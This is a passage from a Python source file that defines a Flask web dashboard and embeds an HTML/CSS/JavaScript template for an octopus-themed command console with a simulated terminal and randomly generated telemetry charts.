            'deploy': '📦 Deployment completed',
            'domain': '🌐 Domain operation completed',
            'monitor': '📡 Monitoring started',
            'agent': '🤖 Agent operation completed',
            'report': '📊 Report generated',
            'email': '📧 Email operation completed',
            'docker': '🐳 Docker operation completed',
            'curl': '🌐 HTTP request completed',
            'netcat': '🔌 Netcat operation completed',
            'traceroute': '🗺️ Traceroute completed',
            'whois': '📋 WHOIS lookup completed',
            'dns': '🌐 DNS resolution completed',
            'wget': '⬇️ Download completed',
            'help': '📖 Help information displayed'
        }
        
        if intent in contextual and command_result.get('success'):
            output = f"{contextual[intent]}\n\n{output}"
        
        command_result['output'] = output
        return command_result

# =====================
# WEB DASHBOARD
# =====================
class WebDashboard:
    def __init__(self, handler, db: DatabaseManager, config: ConfigManager):
        self.handler = handler
        self.db = db
        self.config = config
        self.app = None
        self.socketio = None
        self.running = False
    
    def create_app(self):
        if not WEB_AVAILABLE:
            return None
        
        app = Flask(__name__)
        app.config['SECRET_KEY'] = self.config.get('web.secret_key', secrets.token_hex(32))
        CORS(app)
        
        socketio = SocketIO(app, cors_allowed_origins="*")
        
        # Orange & White Cyclopus Theme Template
        TEMPLATE = '''
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>🐙 MYSTERIOUS CYCLOPUS // Command Console</title>
            <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
            <style>
                :root{
                    --white:#ffffff;
                    --off-white:#fff8f2;
                    --paper:#fffdfb;
                    --orange:#ff7a1a;
                    --orange-deep:#e8600a;
                    --orange-light:#ffb066;
                    --orange-glow:#ffa04d;
                    --ink:#2b2320;
                    --ink-soft:#6b5c52;
                    --line:#ffd9b3;
                    --shadow: 0 10px 30px rgba(232,96,10,0.12);
                    --shadow-lg: 0 20px 60px rgba(232,96,10,0.18);
                    --radius: 18px;
                }
                
                *{ box-sizing: border-box; }
                
                html,body{
                    margin:0; padding:0;
                    background: var(--off-white);
                    color: var(--ink);
                    font-family: 'Courier New', 'Consolas', monospace;
                    overflow-x:hidden;
                }
                
                body{
                    background-image:
                        radial-gradient(circle at 15% 20%, rgba(255,122,26,0.08), transparent 40%),
                        radial-gradient(circle at 85% 80%, rgba(255,122,26,0.10), transparent 45%),
                        linear-gradient(180deg, #fffefc 0%, #fff6ec 100%);
                    min-height:100vh;
                }
                
                .wrap{
                    max-width: 1400px;
                    margin: 0 auto;
                    padding: 28px 24px 60px;
                }
                
                header.top{
                    display:flex;
                    align-items:center;
                    justify-content:space-between;
                    gap: 20px;
                    padding: 18px 26px;
                    background: var(--paper);
                    border: 2px solid var(--line);
                    border-radius: var(--radius);
                    box-shadow: var(--shadow);
                    margin-bottom: 26px;
                    position:relative;
                    overflow:hidden;
                }
                
                header.top::before{
                    content:"";
                    position:absolute;
                    top:-40%; left:-10%;
                    width:220px; height:220px;
                    background: radial-gradient(circle, rgba(255,122,26,0.18), transparent 70%);
                    border-radius:50%;
                    pointer-events:none;
                }
                
                .brand{
                    display:flex;
                    align-items:center;
                    gap:16px;
                }
                
                .brand .logo-dot{
                    width:46px; height:46px;
                    border-radius:50%;
                    background: radial-gradient(circle at 35% 30%, var(--orange-light), var(--orange-deep));
                    box-shadow: 0 0 0 4px #fff, 0 0 0 6px var(--orange-light), 0 6px 18px rgba(232,96,10,0.4);
                    position:relative;
                    flex-shrink:0;
                    animation: pulseDot 2.6s ease-in-out infinite;
                }
                .brand .logo-dot::after{
                    content:"";
                    position:absolute;
                    inset:12px;
                    border-radius:50%;
                    background: #1a1310;
                    box-shadow: inset 0 0 0 2px rgba(255,255,255,0.4);
                }
                @keyframes pulseDot{
                    0%,100%{ transform: scale(1); }
                    50%{ transform: scale(1.12); }
                }
                
                .brand h1{
                    margin:0;
                    font-size: 26px;
                    letter-spacing: 3px;
                    color: var(--orange-deep);
                    text-shadow: 0 2px 0 #fff, 0 0 18px rgba(255,122,26,0.25);
                }
                .brand .tagline{
                    margin:2px 0 0;
                    font-size: 11px;
                    letter-spacing: 4px;
                    color: var(--ink-soft);
                    text-transform: uppercase;
                }
                
                .status-pill{
                    display:flex;
                    align-items:center;
                    gap:10px;
                    background: #fff3e6;
                    border: 1px solid var(--line);
                    padding: 8px 16px;
                    border-radius: 999px;
                    font-size: 12px;
                    color: var(--orange-deep);
                    font-weight: bold;
                    letter-spacing: 1px;
                }
                .status-pill .blip{
                    width:9px; height:9px;
                    border-radius:50%;
                    background: #35c76b;
                    box-shadow: 0 0 8px #35c76b;
                    animation: blink 1.4s infinite;
                }
                @keyframes blink{
                    0%,100%{ opacity:1; }
                    50%{ opacity:0.25; }
                }
                
                .grid{
                    display:grid;
                    grid-template-columns: 340px 1fr;
                    gap: 24px;
                    align-items:start;
                }
                
                @media (max-width: 980px){
                    .grid{ grid-template-columns: 1fr; }
                }
                
                .panel{
                    background: var(--paper);
                    border: 2px solid var(--line);
                    border-radius: var(--radius);
                    box-shadow: var(--shadow);
                    padding: 20px;
                    position:relative;
                }
                
                .panel h2{
                    margin:0 0 14px;
                    font-size: 14px;
                    letter-spacing: 2px;
                    color: var(--orange-deep);
                    text-transform: uppercase;
                    display:flex;
                    align-items:center;
                    gap:8px;
                }
                .panel h2::before{
                    content:"";
                    width:8px; height:8px;
                    background: var(--orange);
                    border-radius:2px;
                    display:inline-block;
                    transform: rotate(45deg);
                }
                
                .octo-stage{
                    display:flex;
                    flex-direction:column;
                    align-items:center;
                    justify-content:center;
                    min-height: 320px;
                    position:relative;
                    background:
                        radial-gradient(circle at 50% 30%, #fff3e6 0%, #fff 70%);
                    border-radius: 14px;
                    border: 1px dashed var(--line);
                    overflow:hidden;
                    padding: 10px;
                }
                
                .bubble{
                    position:absolute;
                    bottom:-20px;
                    border-radius:50%;
                    background: rgba(255,122,26,0.12);
                    border: 1px solid rgba(255,122,26,0.35);
                    animation: floatUp linear infinite;
                }
                @keyframes floatUp{
                    0%{ transform: translateY(0) translateX(0); opacity:0; }
                    10%{ opacity:1; }
                    100%{ transform: translateY(-340px) translateX(var(--drift,10px)); opacity:0; }
                }
                
                svg#octopus{
                    width: 240px;
                    height: 240px;
                    filter: drop-shadow(0 12px 20px rgba(232,96,10,0.25));
                }
                
                .tentacle{
                    transform-origin: top center;
                    animation: sway 3.2s ease-in-out infinite;
                }
                .tentacle:nth-child(1){ animation-delay: 0s; }
                .tentacle:nth-child(2){ animation-delay: 0.15s; }
                .tentacle:nth-child(3){ animation-delay: 0.3s; }
                .tentacle:nth-child(4){ animation-delay: 0.45s; }
                .tentacle:nth-child(5){ animation-delay: 0.6s; }
                .tentacle:nth-child(6){ animation-delay: 0.75s; }
                
                @keyframes sway{
                    0%,100%{ transform: rotate(-6deg); }
                    50%{ transform: rotate(6deg); }
                }
                
                .eye-pupil{
                    animation: lookAround 6s ease-in-out infinite;
                }
                @keyframes lookAround{
                    0%,100%{ transform: translate(0,0); }
                    20%{ transform: translate(3px,-2px); }
                    40%{ transform: translate(-3px,2px); }
                    60%{ transform: translate(2px,2px); }
                    80%{ transform: translate(-2px,-1px); }
                }
                
                .eye-lid{
                    animation: blinkEye 5s infinite;
                    transform-origin: center;
                }
                @keyframes blinkEye{
                    0%,92%,100%{ transform: scaleY(0); }
                    95%{ transform: scaleY(1); }
                }
                
                .octo-caption{
                    margin-top: 10px;
                    font-size: 11px;
                    letter-spacing: 2px;
                    color: var(--ink-soft);
                    text-transform: uppercase;
                    text-align:center;
                }
                
                .octo-caption b{ color: var(--orange-deep); }
                
                .vitals{
                    margin-top: 18px;
                    display:flex;
                    flex-direction:column;
                    gap: 10px;
                }
                .vital-row{
                    display:flex;
                    justify-content:space-between;
                    align-items:center;
                    font-size: 12px;
                    padding: 8px 10px;
                    background: #fff6ec;
                    border: 1px solid var(--line);
                    border-radius: 8px;
                }
                .vital-row span.label{ color: var(--ink-soft); letter-spacing: 1px; }
                .vital-row span.val{ color: var(--orange-deep); font-weight:bold; }
                
                .console{
                    display:flex;
                    flex-direction:column;
                    gap: 16px;
                }
                
                .terminal{
                    background: #1c140e;
                    border-radius: 14px;
                    border: 2px solid var(--orange-deep);
                    box-shadow: var(--shadow-lg), inset 0 0 40px rgba(255,122,26,0.06);
                    overflow:hidden;
                }
                
                .term-titlebar{
                    display:flex;
                    align-items:center;
                    gap:8px;
                    padding: 10px 14px;
                    background: linear-gradient(180deg, #2a1d14, #1c140e);
                    border-bottom: 1px solid rgba(255,122,26,0.25);
                }
                .term-titlebar .dot{
                    width:11px; height:11px; border-radius:50%;
                }
                .dot.red{ background:#ff5f57; }
                .dot.yellow{ background:#febc2e; }
                .dot.green{ background:#28c840; }
                .term-titlebar .term-name{
                    margin-left: 8px;
                    font-size: 12px;
                    color: var(--orange-light);
                    letter-spacing: 2px;
                }
                
                #term-output{
                    height: 360px;
                    overflow-y: auto;
                    padding: 16px 18px;
                    font-size: 13px;
                    line-height: 1.6;
                    color: #ffd9ae;
                }
                #term-output::-webkit-scrollbar{ width: 8px; }
                #term-output::-webkit-scrollbar-thumb{ background: var(--orange-deep); border-radius: 4px; }
                #term-output::-webkit-scrollbar-track{ background: #241a12; }
                
                .line{ margin-bottom: 4px; white-space: pre-wrap; word-break: break-word; }
                .line .prompt-tag{ color: #ff8c2e; }
                .line.system{ color: #9adfb0; }
                .line.warn{ color: #ffcf6b; }
                .line.err{ color: #ff7a7a; }
                .line.info{ color: #ffd9ae; }
                .line.echo{ color: #ffffff; }
                
                .term-input-row{
                    display:flex;
                    align-items:center;
                    gap:10px;
                    padding: 12px 16px;
                    background: #24190f;
                    border-top: 1px solid rgba(255,122,26,0.25);
                }
                .term-input-row .caret{
                    color: var(--orange);
                    font-weight:bold;
                }
                #term-input{
                    flex:1;
                    background: transparent;
                    border: none;
                    outline: none;
                    color: #fff3e6;
                    font-family: inherit;
                    font-size: 14px;
                    letter-spacing: 0.5px;
                }
                #term-input::placeholder{ color: #7a5a41; }
                
                .quick-cmds{
                    display:flex;
                    flex-wrap:wrap;
                    gap: 8px;
                }
                .quick-cmds button{
                    background: #fff3e6;
                    border: 1px solid var(--orange-light);
                    color: var(--orange-deep);
                    padding: 7px 14px;
                    border-radius: 999px;
                    font-size: 11px;
                    letter-spacing: 1px;
                    cursor:pointer;
                    font-family: inherit;
                    transition: all 0.15s ease;
                }
                .quick-cmds button:hover{
                    background: var(--orange);
                    color:#fff;
                    transform: translateY(-2px);
                    box-shadow: 0 6px 14px rgba(232,96,10,0.35);
                }
                
                .charts-row{
                    display:grid;
                    grid-template-columns: 1.3fr 1fr;
                    gap: 20px;
                }
                @media (max-width: 760px){
                    .charts-row{ grid-template-columns: 1fr; }
                }
                
                canvas{
                    width:100%;
                    display:block;
                }
                
                .legend{
                    display:flex;
                    flex-wrap:wrap;
                    gap: 10px 16px;
                    margin-top: 12px;
                    font-size: 11px;
                }
                .legend .item{
                    display:flex;
                    align-items:center;
                    gap:6px;
                    color: var(--ink-soft);
                }
                .legend .swatch{
                    width:11px; height:11px;
                    border-radius:3px;
                    display:inline-block;
                }
                
                .chart-foot{
                    display:flex;
                    justify-content:space-between;
                    align-items:center;
                    margin-top:10px;
                }
                .refresh-btn{
                    background: var(--orange);
                    border:none;
                    color:#fff;
                    padding: 8px 16px;
                    border-radius: 8px;
                    font-size: 11px;
                    letter-spacing: 1px;
                    cursor:pointer;
                    font-family: inherit;
                    box-shadow: 0 6px 14px rgba(232,96,10,0.3);
                    transition: transform 0.15s ease;
                }
                .refresh-btn:hover{ transform: translateY(-2px); }
                
                footer{
                    text-align:center;
                    margin-top: 30px;
                    font-size: 11px;
                    color: var(--ink-soft);
                    letter-spacing: 2px;
                }
                footer b{ color: var(--orange-deep); }
                
                .glow-underline{
                    height:3px;
                    width:60px;
                    margin: 8px auto 0;
                    background: linear-gradient(90deg, transparent, var(--orange), transparent);
                    border-radius: 2px;
                }
            </style>
        </head>
        <body>
        
        <div class="wrap">
        
          <header class="top">
            <div class="brand">
              <div class="logo-dot"></div>
              <div>
                <h1>MYSTERIOUS CYCLOPUS</h1>
                <p class="tagline">Deep-Sea Command &amp; Data Console</p>
              </div>
            </div>
            <div class="status-pill">
              <span class="blip"></span>
              <span id="clock-status">SYSTEM ONLINE</span>
            </div>
          </header>
        
          <div class="grid">
        
            <!-- LEFT: Octopus + vitals -->
            <div class="panel">
              <h2>Cyclopus Unit</h2>
              <div class="octo-stage" id="octoStage">
                <svg id="octopus" viewBox="0 0 200 200" xmlns="http://www.w3.org/2000/svg">
                  <defs>
                    <radialGradient id="headGrad" cx="35%" cy="30%" r="75%">
                      <stop offset="0%" stop-color="#ffb066"/>
                      <stop offset="60%" stop-color="#ff7a1a"/>
                      <stop offset="100%" stop-color="#e8600a"/>
                    </radialGradient>
                  </defs>
        
                  <!-- Tentacles (behind head) -->
                  <g stroke="#e8600a" stroke-width="10" fill="none" stroke-linecap="round">
                    <path class="tentacle" d="M70,120 Q55,150 65,180" />
                    <path class="tentacle" d="M85,130 Q75,165 85,195" />
                    <path class="tentacle" d="M100,135 Q100,170 100,198" />
                    <path class="tentacle" d="M115,130 Q125,165 115,195" />
                    <path class="tentacle" d="M130,120 Q145,150 135,180" />
                    <path class="tentacle" d="M60,105 Q40,125 45,155" />
                  </g>
        
                  <!-- Head -->
                  <ellipse cx="100" cy="95" rx="60" ry="55" fill="url(#headGrad)" stroke="#c9540a" stroke-width="2"/>
        
                  <!-- Single big eye (Cyclopus) -->
                  <circle cx="100" cy="92" r="30" fill="#fffdfb" stroke="#c9540a" stroke-width="2"/>
                  <g class="eye-pupil">
                    <circle cx="100" cy="92" r="15" fill="#241a12"/>
                    <circle cx="94" cy="86" r="4" fill="#fff"/>
                  </g>
                  <rect class="eye-lid" x="70" y="62" width="60" height="30" fill="url(#headGrad)"/>
        
                  <!-- Little highlight -->
                  <ellipse cx="75" cy="65" rx="14" ry="8" fill="#ffd9ae" opacity="0.6"/>
                </svg>
              </div>
              <p class="octo-caption">Status: <b id="octoMood">CALM &amp; WATCHFUL</b></p>
              <div class="glow-underline"></div>
        
              <div class="vitals">
                <div class="vital-row"><span class="label">INK RESERVE</span><span class="val" id="v-ink">92%</span></div>
                <div class="vital-row"><span class="label">TENTACLE SYNC</span><span class="val" id="v-sync">88%</span></div>
                <div class="vital-row"><span class="label">SIGNAL DEPTH</span><span class="val" id="v-depth">312m</span></div>
                <div class="vital-row"><span class="label">UPTIME</span><span class="val" id="v-uptime">00:00:00</span></div>
              </div>
            </div>
        
            <!-- RIGHT: Console + charts -->
            <div class="console">
        
              <div class="panel">
                <h2>Command Uplink</h2>
                <div class="terminal">
                  <div class="term-titlebar">
                    <span class="dot red"></span>
                    <span class="dot yellow"></span>
                    <span class="dot green"></span>
                    <span class="term-name">cyclopus@abyss:~$</span>
                  </div>
                  <div id="term-output"></div>
                  <div class="term-input-row">
                    <span class="caret">&gt;</span>
                    <input type="text" id="term-input" placeholder="type 'help' to see available commands..." autocomplete="off" spellcheck="false"/>
                  </div>
                </div>
                <br/>
                <div class="quick-cmds">
                  <button data-cmd="help">help</button>
                  <button data-cmd="status">status</button>
                  <button data-cmd="scan">scan</button>
                  <button data-cmd="data">data</button>
                  <button data-cmd="ink">ink cloud</button>
                  <button data-cmd="wave">wave tentacles</button>
                  <button data-cmd="clear">clear</button>
                </div>
              </div>
        
              <div class="panel">
                <h2>Telemetry Charts</h2>
                <div class="charts-row">
                  <div>
                    <canvas id="barChart" width="480" height="280"></canvas>
                    <div class="legend" id="barLegend"></div>
                  </div>
                  <div>
                    <canvas id="pieChart" width="280" height="280"></canvas>
                    <div class="legend" id="pieLegend"></div>
                  </div>
                </div>
                <div class="chart-foot">
                  <span style="font-size:11px;color:var(--ink-soft);letter-spacing:1px;">LIVE SIMULATED DATA STREAM</span>
                  <button class="refresh-btn" id="refreshChartsBtn">REFRESH DATA</button>
                </div>
              </div>
        
            </div>
          </div>
        
          <footer>
            <b>MYSTERIOUS CYCLOPUS</b> &mdash; ORANGE &amp; WHITE COMMAND CONSOLE &mdash; ALL DATA SIMULATED CLIENT-SIDE
          </footer>
        </div>
        
        <script>
        /* =========================================================
           MYSTERIOUS CYCLOPUS — Command Console
           Single-file HTML/CSS/JS app
           ========================================================= */
        
        /* ---------- Utility ---------- */
        function pad(n){ return n.toString().padStart(2,'0'); }
        function randInt(min,max){ return Math.floor(Math.random()*(max-min+1))+min; }
        function fmtTime(sec){
          const h = Math.floor(sec/3600);
          const m = Math.floor((sec%3600)/60);
          const s = Math.floor(sec%60);
          return `${pad(h)}:${pad(m)}:${pad(s)}`;
        }
        
        /* ---------- Uptime clock ---------- */
        let uptimeSeconds = 0;
        setInterval(()=>{
          uptimeSeconds++;
          document.getElementById('v-uptime').textContent = fmtTime(uptimeSeconds);
        }, 1000);
        
        /* ---------- Vitals drift ---------- */
        setInterval(()=>{
          const ink = document.getElementById('v-ink');
          const sync = document.getElementById('v-sync');
          const depth = document.getElementById('v-depth');
          let inkVal = parseInt(ink.textContent);
          let syncVal = parseInt(sync.textContent);
          inkVal = Math.min(100, Math.max(40, inkVal + randInt(-3,3)));
          syncVal = Math.min(100, Math.max(50, syncVal + randInt(-2,4)));
          ink.textContent = inkVal + '%';
          sync.textContent = syncVal + '%';
          depth.textContent = randInt(280,420) + 'm';
        }, 4000);
        
        /* ---------- Bubbles background animation ---------- */
        const octoStage = document.getElementById('octoStage');
        function spawnBubble(){
          const b = document.createElement('div');
          b.className = 'bubble';
          const size = randInt(6,18);
          b.style.width = size+'px';
          b.style.height = size+'px';
          b.style.left = randInt(5,95)+'%';
          b.style.setProperty('--drift', randInt(-30,30)+'px');
          b.style.animationDuration = randInt(4,9)+'s';
          octoStage.appendChild(b);
          setTimeout(()=> b.remove(), 9000);
        }
        setInterval(spawnBubble, 700);
        for(let i=0;i<6;i++) setTimeout(spawnBubble, i*300);
        
        /* ---------- Octopus mood + special animations ---------- */
        const octoMood = document.getElementById('octoMood');
        const octopusSvg = document.getElementById('octopus');
        
        function setMood(text){
          octoMood.textContent = text;
        }
        
        function waveTentaclesBurst(){
          const tentacles = document.querySelectorAll('.tentacle');
          tentacles.forEach((t,i)=>{
            t.style.animation = 'none';
            void t.offsetWidth;
            t.style.animation = `sway 0.6s ease-in-out ${i*0.05}s 4`;
          });
          setMood('TENTACLES ACTIVE');
          setTimeout(()=> setMood('CALM & WATCHFUL'), 3000);
        }
        
        function inkCloudEffect(){
          setMood('RELEASING INK CLOUD...');
          octopusSvg.style.transition = 'filter 0.4s ease';
          octopusSvg.style.filter = 'drop-shadow(0 12px 20px rgba(43,35,32,0.55)) brightness(0.6)';
          setTimeout(()=>{
            octopusSvg.style.filter = 'drop-shadow(0 12px 20px rgba(232,96,10,0.25))';
            setMood('CALM & WATCHFUL');
          }, 1400);
        }
        
        /* =========================================================
           TERMINAL / COMMAND ENGINE
           ========================================================= */
        const outputEl = document.getElementById('term-output');
        const inputEl = document.getElementById('term-input');
        
        function printLine(text, cls){
          const div = document.createElement('div');
          div.className = 'line ' + (cls || 'info');
          div.textContent = text;
          outputEl.appendChild(div);
          outputEl.scrollTop = outputEl.scrollHeight;
        }
        
        function printHTMLLine(html, cls){
          const div = document.createElement('div');
          div.className = 'line ' + (cls || 'info');
          div.innerHTML = html;
          outputEl.appendChild(div);
          outputEl.scrollTop = outputEl.scrollHeight;
        }
        
        const BOOT_LINES = [
          ['booting cyclopus core kernel...', 'system'],
          ['loading tentacle drivers ......... OK', 'system'],
          ['calibrating single-eye sensor .... OK', 'system'],
          ['establishing abyssal uplink ...... OK', 'system'],
          ['MYSTERIOUS CYCLOPUS v1.0 ready.', 'system'],
          ["type 'help' to view available commands.", 'info'],
        ];
        
        function bootSequence(){
          let i = 0;
          const interval = setInterval(()=>{
            if(i >= BOOT_LINES.length){ clearInterval(interval); return; }
            printLine(BOOT_LINES[i][0], BOOT_LINES[i][1]);
            i++;
          }, 220);
        }
        
        const HELP_TEXT = `
        AVAILABLE COMMANDS:
          help              show this help menu
          status            show system status report
          scan              run a simulated environment scan
          data              print current telemetry dataset
          chart / refresh   regenerate bar & pie chart data
          ink               trigger ink cloud animation
          wave              trigger tentacle wave animation
          mood <text>       set cyclopus mood label
          ping <host>       simulate a network ping
          whoami            show current operator identity
          date              show current date/time
          theme             show theme info
          history           show command history
          clear             clear the terminal screen
        `;
        
        let commandHistory = [];
        let historyIndex = -1;
        
        function handleCommand(raw){
          const trimmed = raw.trim();
          if(trimmed.length === 0) return;
        
          printLine('> ' + trimmed, 'echo');
          commandHistory.push(trimmed);
          historyIndex = commandHistory.length;
        
          const parts = trimmed.split(/\\s+/);
          const cmd = parts[0].toLowerCase();
          const args = parts.slice(1);
        
          switch(cmd){
            case 'help':
              HELP_TEXT.split('\\n').forEach(l => { if(l.trim().length) printLine(l, 'info'); });
              break;
        
            case 'clear':
              outputEl.innerHTML = '';
              break;
        
            case 'status':
              printLine('SYSTEM STATUS REPORT', 'system');
              printLine('  Core:        ONLINE', 'info');
              printLine('  Eye Sensor:  ACTIVE (single-lens, wide arc)', 'info');
              printLine('  Tentacles:   6 / 6 responsive', 'info');
              printLine('  Ink Reserve: ' + document.getElementById('v-ink').textContent, 'info');
              printLine('  Uptime:      ' + document.getElementById('v-uptime').textContent, 'info');
              break;
        
            case 'scan':
              runScanSequence();
              break;
        
            case 'data':
              printCurrentData();
              break;
        
            case 'chart':
            case 'refresh':
              regenerateChartData();
              printLine('telemetry charts refreshed.', 'system');
              break;
        
            case 'ink':
              inkCloudEffect();
              printLine('ink cloud released into the console.', 'system');
              break;
        
            case 'wave':
              waveTentaclesBurst();
              printLine('all tentacles waving in sync.', 'system');
              break;
        
            case 'mood':
              if(args.length === 0){
                printLine('usage: mood <text>', 'warn');
              } else {
                const moodText = args.join(' ').toUpperCase();
                setMood(moodText);
                printLine('mood set to: ' + moodText, 'system');
              }
              break;
        
            case 'ping':
              simulatePing(args[0]);
              break;
        
            case 'whoami':
              printLine('operator: guest-diver-' + randInt(1000,9999), 'info');
              break;
        
            case 'date':
              printLine(new Date().toString(), 'info');
              break;
        
            case 'theme':
              printLine('theme: WHITE / ORANGE — "Mysterious Cyclopus"', 'info');
              break;
        
            case 'history':
              if(commandHistory.length === 0){
                printLine('no history yet.', 'warn');
              } else {
                commandHistory.forEach((h,idx)=> printLine(`${idx+1}. ${h}`, 'info'));
              }
              break;
        
            default:
              printLine(`unknown command: '${cmd}' — type 'help' for a list of commands.`, 'err');
          }
        }
        
        function runScanSequence(){
          printLine('initiating environment scan...', 'system');
          const steps = [
            'pinging surrounding sonar buoys...',
            'analyzing current drift patterns...',
            'cross-referencing thermal layers...',
            'checking for anomalous signals...',
          ];
          let i = 0;
          const interval = setInterval(()=>{
            if(i >= steps.length){
              clearInterval(interval);
              const anomalies = randInt(0,3);
              if(anomalies === 0){
                printLine('scan complete: no anomalies detected.', 'system');
              } else {
                printLine(`scan complete: ${anomalies} anomal${anomalies===1?'y':'ies'} flagged for review.`, 'warn');
              }
              regenerateChartData();
              return;
            }
            printLine(steps[i], 'info');
            i++;
          }, 380);
        }
        
        function printCurrentData(){
          printLine('CURRENT TELEMETRY DATASET:', 'system');
          barLabels.forEach((label, idx)=>{
            printLine(`  ${label.padEnd(10,' ')} : ${barData[idx]}`, 'info');
          });
          printLine('DISTRIBUTION:', 'system');
          pieLabels.forEach((label, idx)=>{
            printLine(`  ${label.padEnd(10,' ')} : ${pieData[idx]}%`, 'info');
          });
        }
        
        function simulatePing(host){
          if(!host){
            printLine('usage: ping <host>', 'warn');
            return;
          }
          printLine(`PING ${host}: 4 packets`, 'system');
          let sent = 0;
          const interval = setInterval(()=>{
            sent++;
            const time = randInt(8,120);
            printLine(`  reply from ${host}: time=${time}ms`, 'info');
            if(sent >= 4){
              clearInterval(interval);
              printLine(`--- ${host} ping statistics: 4 sent, 4 received, 0% loss ---`, 'system');
            }
          }, 300);
        }
        
        /* Input handling */
        inputEl.addEventListener('keydown', (e)=>{
          if(e.key === 'Enter'){
            const val = inputEl.value;
            inputEl.value = '';
            handleCommand(val);
          } else if(e.key === 'ArrowUp'){
            e.preventDefault();
            if(commandHistory.length){
              historyIndex = Math.max(0, historyIndex - 1);
              inputEl.value = commandHistory[historyIndex] || '';
            }
          } else if(e.key === 'ArrowDown'){
            e.preventDefault();
            if(commandHistory.length){
              historyIndex = Math.min(commandHistory.length, historyIndex + 1);
              inputEl.value = commandHistory[historyIndex] || '';
            }
          }
        });
        
        document.querySelectorAll('.quick-cmds button').forEach(btn=>{
          btn.addEventListener('click', ()=>{
            const cmd = btn.getAttribute('data-cmd');
            inputEl.value = cmd;
            handleCommand(cmd);
            inputEl.value = '';
            inputEl.focus();
          });
        });
        
        /* =========================================================
           CHARTS — pure canvas, no external dependencies
           ========================================================= */
        const ORANGE_PALETTE = ['#ff7a1a', '#ffa04d', '#ffc285', '#e8600a', '#ffd9b3', '#c9540a'];
        
        let barLabels = ['SCANS', 'PINGS', 'ALERTS', 'UPLINKS', 'ANOMALY'];
        let barData = [];
        
        let pieLabels = ['CALM WATERS', 'MILD CURRENT', 'HIGH ALERT', 'UNKNOWN'];
        let pieData = [];
        
        function randomizeData(){
          barData = barLabels.map(()=> randInt(10, 100));
          let remaining = 100;
          pieData = pieLabels.map((label, idx)=>{
            if(idx === pieLabels.length - 1) return remaining;
            const val = randInt(5, Math.max(6, Math.floor(remaining/2)));
            remaining -= val;
            return val;
          });
        }
        randomizeData();
        
        /* ---- Bar chart ---- */
        const barCanvas = document.getElementById('barChart');
        const barCtx = barCanvas.getContext('2d');
        
        function drawBarChart(){
          const w = barCanvas.width;
          const h = barCanvas.height;
          barCtx.clearRect(0,0,w,h);
        
          const padding = { top: 20, right: 20, bottom: 40, left: 40 };
          const chartW = w - padding.left - padding.right;
          const chartH = h - padding.top - padding.bottom;
          const maxVal = Math.max(...barData, 10) * 1.15;
        
          barCtx.strokeStyle = '#ffe4c4';
          barCtx.lineWidth = 1;
          const gridLines = 4;
          for(let i=0;i<=gridLines;i++){
            const y = padding.top + (chartH / gridLines) * i;
            barCtx.beginPath();
            barCtx.moveTo(padding.left, y);
            barCtx.lineTo(w - padding.right, y);
            barCtx.stroke();
        
            const val = Math.round(maxVal - (maxVal/gridLines)*i);
            barCtx.fillStyle = '#a9948a';
            barCtx.font = '10px Courier New';
            barCtx.textAlign = 'right';
            barCtx.fillText(val, padding.left - 8, y + 3);
          }
        
          const n = barData.length;
          const gap = 18;
          const barW = (chartW - gap*(n-1)) / n;
        
          barData.forEach((val, idx)=>{
            const barH = (val / maxVal) * chartH;
            const x = padding.left + idx * (barW + gap);
            const y = padding.top + chartH - barH;
        
            const grad = barCtx.createLinearGradient(0, y, 0, y+barH);
            grad.addColorStop(0, ORANGE_PALETTE[idx % ORANGE_PALETTE.length]);
            grad.addColorStop(1, '#ffcf9e');
        
            barCtx.fillStyle = grad;
            roundRect(barCtx, x, y, barW, barH, 6);
            barCtx.fill();
        
            barCtx.fillStyle = '#e8600a';
            barCtx.font = 'bold 11px Courier New';
            barCtx.textAlign = 'center';
            barCtx.fillText(val, x + barW/2, y - 6);
        
            barCtx.fillStyle = '#6b5c52';
            barCtx.font = '10px Courier New';
            barCtx.fillText(barLabels[idx], x + barW/2, h - padding.bottom + 16);
          });
        
          barCtx.strokeStyle = '#e8600a';
          barCtx.lineWidth = 1.5;
          barCtx.beginPath();
          barCtx.moveTo(padding.left, padding.top);
          barCtx.lineTo(padding.left, h - padding.bottom);
          barCtx.lineTo(w - padding.right, h - padding.bottom);
          barCtx.stroke();
        }
        
        function roundRect(ctx, x, y, w, h, r){
          if(h < 0){ y += h; h = Math.abs(h); }
          ctx.beginPath();
          ctx.moveTo(x + r, y);
          ctx.lineTo(x + w - r, y);
          ctx.quadraticCurveTo(x+w, y, x+w, y+r);
          ctx.lineTo(x+w, y+h);
          ctx.lineTo(x, y+h);
          ctx.lineTo(x, y+r);
          ctx.quadraticCurveTo(x, y, x+r, y);
          ctx.closePath();
        }
        
        /* ---- Pie chart ---- */
        const pieCanvas = document.getElementById('pieChart');
        const pieCtx = pieCanvas.getContext('2d');
        
        function drawPieChart(){
          const w = pieCanvas.width;
          const h = pieCanvas.height;
          pieCtx.clearRect(0,0,w,h);
        
          const cx = w/2, cy = h/2;
          const radius = Math.min(w,h)/2 - 16;
          const total = pieData.reduce((a,b)=>a+b, 0) || 1;
        
          let startAngle = -Math.PI/2;
        
          pieData.forEach((val, idx)=>{
            const sliceAngle = (val/total) * Math.PI * 2;
            const endAngle = startAngle + sliceAngle;
        
            pieCtx.beginPath();
            pieCtx.moveTo(cx, cy);
            pieCtx.arc(cx, cy, radius, startAngle, endAngle);
            pieCtx.closePath();
            pieCtx.fillStyle = ORANGE_PALETTE[idx % ORANGE_PALETTE.length];
            pieCtx.fill();
            pieCtx.strokeStyle = '#fffdfb';
            pieCtx.lineWidth = 3;
            pieCtx.stroke();
        
            const midAngle = startAngle + sliceAngle/2;
            const labelX = cx + Math.cos(midAngle) * radius * 0.65;
            const labelY = cy + Math.sin(midAngle) * radius * 0.65;
            const pct = Math.round((val/total)*100);
            if(pct > 4){
              pieCtx.fillStyle = '#2b2320';
              pieCtx.font = 'bold 11px Courier New';
              pieCtx.textAlign = 'center';
              pieCtx.fillText(pct + '%', labelX, labelY);
            }
        
            startAngle = endAngle;
          });
        
          pieCtx.beginPath();
          pieCtx.arc(cx, cy, radius*0.42, 0, Math.PI*2);
          pieCtx.fillStyle = '#fffdfb';
          pieCtx.fill();
        
          pieCtx.fillStyle = '#e8600a';
          pieCtx.font = 'bold 12px Courier New';
          pieCtx.textAlign = 'center';
          pieCtx.fillText('CYCLOPUS', cx, cy - 4);
          pieCtx.font = '9px Courier New';
